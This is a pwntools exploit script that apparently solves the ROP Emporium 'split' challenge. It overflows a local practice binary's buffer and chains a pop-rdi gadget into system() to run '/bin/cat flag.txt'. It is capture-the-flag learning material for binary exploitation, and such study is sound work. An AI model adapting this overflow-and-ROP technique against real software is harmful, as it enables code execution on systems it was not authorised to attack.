from pwn import *
import sys

# rabin2 -z split
# 000 0x00001060 0x00601060  17  18 (.data) ascii /bin/cat flag.txt

# nm split | grep ' t '
# 0000000000400742 t usefulFunction

if len(sys.argv) == 2:
    r = gdb.debug(['./split'], '''
    b *0x400741
    ''')
else:
    r = process('./split')


ret_addr = 0x400741
system_addr = 0x40074b
cat_flag_addr = 0x601060
pop_rdi = 0x4007c3

chain = p64(pop_rdi) + p64(cat_flag_addr) + p64(system_addr)

payload = 'A' * cyclic_find('kaaalaaa') + chain
r.sendline(payload)

r.interactive()

